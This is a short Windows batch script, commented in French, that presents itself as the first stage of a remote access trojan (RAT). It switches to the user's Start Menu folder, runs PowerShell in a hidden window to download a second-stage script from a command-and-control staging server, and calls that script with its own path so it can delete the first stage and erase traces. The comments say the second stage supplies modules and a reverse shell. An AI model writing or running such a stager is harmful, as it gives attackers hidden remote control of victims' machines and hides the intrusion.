@REM phase initiale du RAT

@REM variables
set "INITIAL_PATH=%cd%"
set "FILE_NAME=phase1.cmd"
set "STAGING_PATH=http://10.0.0.212:8000/staging"
set "STARTUP_PATH=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\"

@REM se déplacer dans un autre dossier
cd %STARTUP_PATH%

@REM récupérer la phase 2 à partir du C&C, afin de télécharger les modules et nous fournir un « reverse shell ».
powershell -WindowStyle Hidden -c "Invoke-WebRequest -Uri %STAGING_PATH%/phase2.cmd -Outfile phase2.cmd"

@REM appeler la phase 2 en passant le chemin du dossier initale, afin de supprimer la phase initiale (effacer les traces)
call phase2.cmd %INITIAL_PATH%\%FILE_NAME%"

